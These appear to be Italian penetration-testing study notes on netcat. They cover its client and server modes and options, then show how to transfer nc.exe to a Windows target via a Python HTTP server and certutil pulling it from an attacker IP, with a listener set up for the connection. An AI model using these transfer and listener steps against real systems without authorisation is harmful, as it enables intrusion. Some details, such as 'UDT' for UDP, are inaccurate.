E’ un **port scanner,** che ci permette di verificare, in un range di porte, se esse siano aperte o chiuse, quindi se permettono al comunicazione con lo scambio di pacchetti **TCP o UDT.**

E’ cross platform e supporta tutte le distribuzioni linux e windows

**Netcat** utilizza **un'architettura** di comunicazione **client**-**server** con due modalità:

- **Modalità client** - Netcat può essere utilizzato in modalità client per connettersi a qualsiasi porta
TCP/UDP e a un ascoltatore Netcat (server).
- **Modalità server** - Netcat può essere utilizzato per ascoltare le connessioni dei client su una porta specifica

Netcat può essere utilizzato dai penetration tester per eseguire le seguenti funzionalità:

- Cattura del banner
- Scansione della porta
- Trasferimento di file
- Reverse/Bind shell

---

- `nc -h` apre il manuale
    - -n non risolve il dns
    - -v verbosità
    - -l listner per le chiamata in entrata
    - -p port
    - -u udp port (es: 139,161,445)

MODALITA’ CLIENT, ci connettiamo al server

- `nc -nv IP_TARGET PORT`

INVIARE L’ESEGUIBILE netcat IN UN DISPOSITIVO WINDOWS

1. `cd /usr/share/windows-binaries` è la directory dove è presente nc.exe
2. `python -m SimpleHTTPServer 80` apriamo un server con python per trasferire il file
3. dal pc target andare sul browser ed inserire l’IP dell’attaccante e scaricare `nc.exe`
    1. OPPURE TRAMITE SHELL DI COMANDO DAL TARGET 
    2. `C:\Windows\Temp` ci spostiamo in Temp, dove verrà scaricato il file
    3. `certutil -urlcache -f [http://IP_ATTACCANTE/nc.exe](http://10.10.31.2/nc.exe) nc.exe`
4. CLI ATTANCANTE `nc -nvlp PORT` ci mettiamo in ascolto
5. CLI TARGET  `./nc.exe` avviamo
6. `-nv IP_ATTACCANTE PORT` comando
